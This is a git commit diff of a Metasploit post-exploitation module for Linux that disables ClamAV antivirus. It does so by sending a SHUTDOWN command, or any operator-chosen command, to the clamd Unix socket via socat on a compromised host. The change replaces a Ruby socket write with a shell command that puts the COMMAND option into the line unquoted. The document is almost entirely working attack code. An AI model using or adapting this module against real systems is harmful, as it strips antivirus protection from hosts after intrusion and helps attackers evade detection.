9ff4cdfd5ca259e9453825e5b58d29f85af476f7
archcloudlabs <1250113+archcloudlabs@users.noreply.github.com>
2023-02-22 21:40:26 -0500

    updated w/ socat method

--- modules/post/linux/manage/disable_clamav.rb
+++ modules/post/linux/manage/disable_clamav.rb
@@ -2,45 +2,56 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-require 'socket'
+
 class MetasploitModule < Msf::Post
   Rank = ExcellentRanking
-
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(_info = {})
+
+  def initialize(info = {})
     super(
-      'Name' => 'Disable ClamAV',
-      'Description' => %q{
+      update_info(
+        info,
+        'Name' => 'Disable ClamAV',
+        'Description' => %q{
           This module will write to the ClamAV Unix socket to shutoff ClamAV.
         },
-      'License' => MSF_LICENSE,
-      'Author' => [
-        'DLL_Cool_J'
-      ],
-      'Platform' => [ 'linux' ],
-      'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'DLL_Cool_J'
+        ],
+        'Platform' => [ 'linux' ],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
       )
+    )
     register_options(
       [
-        OptString.new('CLAMAV_UNIX_SOCKET', [true, 'ClamAV unix socket', '/run/clamav/clamd.ctl' ])
-      ]
+        OptString.new("CLAMAV_UNIX_SOCKET", [true, "ClamAV unix socket", "/run/clamav/clamd.ctl" ]),
+        OptString.new("COMMAND", [true, "ClamAV command to execute", "SHUTDOWN" ])
+      ], self.class
     )
   end
 
-  def run
+
+ def run
     clamav_socket = datastore['CLAMAV_UNIX_SOCKET']
-    print_status("Checking file path #{clamav_socket} exists and is writable... ")
-    if writable?(datastore[CLAMAV_UNIX_SOCKET])
-      print_good('File does exist and is writable!')
+		cmd = datastore['COMMAND']
 
-      Socket.unix(datastore[CLAMAV_UNIX_SOCKET]) do |sock|
-        print_status('Shutting down ClamAV!')
-        sock.write('SHUTDOWN')
-      end
-      return true
+    if command_exists?("socat")
+      print_good("socat exists") 
+    else
+      print_bad("socat does not exist on target host. Quitting!")
+      return
     end
-  end
 
+    print_status("Checking file path #{clamav_socket} exists and is writable... ")
+		if writable?("#{clamav_socket}")
+			print_good("File does exist and is writable!")
+			print_good("Sending #{cmd}...")
+      cmd_exec("echo #{cmd} | socat - UNIX-CONNECT:#{clamav_socket}")
+    else
+			print_bad("File does NOT exist or is not writable!")
+	 end
+  end
 end
